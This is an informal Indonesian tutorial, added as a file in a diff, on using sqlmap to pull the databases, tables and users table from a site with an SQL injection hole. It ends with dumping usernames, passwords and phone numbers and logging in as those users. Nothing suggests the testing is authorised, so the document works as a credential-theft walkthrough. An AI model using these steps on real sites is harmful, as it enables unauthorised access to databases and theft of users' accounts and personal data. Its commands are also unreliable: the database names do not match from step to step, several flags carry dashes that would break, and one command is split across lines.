@@ -1,0 +1,43 @@
+Nahh… Kita Sudah siap Untuk menginstall SQLMAP, skrang tinggal cara penggunaan. :
+Kita buat contoh website target : http://www.contoh.com/product.php?id=1
+Ok, Itu sebagai  contoh Untuk kita masuki database nya..
+
+Ketikkan Perintah Berikut :
+
+ $python2 sqlmap.py -u http://www.contoh.com/product.php?id=1 --dbs
+
+Dan tekan Enter..
+Kalau vuln, Nanti akan Di tunjukkan nama” Database nya, contoh :
+
+*information_schema
+*sdgsd4484sd
+
+Nah itulah contoh database nya, Kita buka database
+*sdgsd4488sd
+Karena yang information_schema nggak ada gunanya :v
+Lanjut untuk membuka, ketik perintah :
+
+$python2 sqlmap.py -u http://www.contoh.com/product.php?id=1 –D asgsd4488sd –tables
+
+Nanti akan di beikan informasi” dalam bentuk table, beserta nama- nama dalam table nya,  tapi belum cukup, kita harus membuka lebih dalam lagi..
+
+$ $python2 sqlmap.py -u http://www.contoh.com/product.php?id=1 -D
+Asgsd4488sd –T users --columns
+
+Untuk memberikan dalam bentuk Kolom Dari Tabel users, maka disitu nanti akan tertera apa aja yg ada di dalam table nya, tapi biasanya yang ada : email, phone, username, password, phone
+Nah tinggal kita dump untuk mengetahui username dan password nya
+
+$ python2 sqlmap.py -u http://www.contoh.com/product.php?id=1 -D
+Asgsd4488sd –T users –C username,password,phone –dump
+
+Kalau sudah, nanti akan diberikan Username , password, dan nomor hp, jad itinggal kita masukkan ke website tersebut dan kita sudah bisa memasuki sebagai user ( pengguna )
+
+·        --dbs         = Untuk memberikan Database
+·        -D             = Nama Database nya
+·        -u              = URL dari website yang mau di dump
+·        --tables     = Untuk memberikan nama – nama table
+·        -T              = Nama Tabel
+·        --columns = Untuk memberikan data yang ada pada table
+·        -C             = Nama – nama di dalam kolom
+·        --dump     = proses akhir untuk mendapatkan username, password   
+                        dan Nomor Handphone
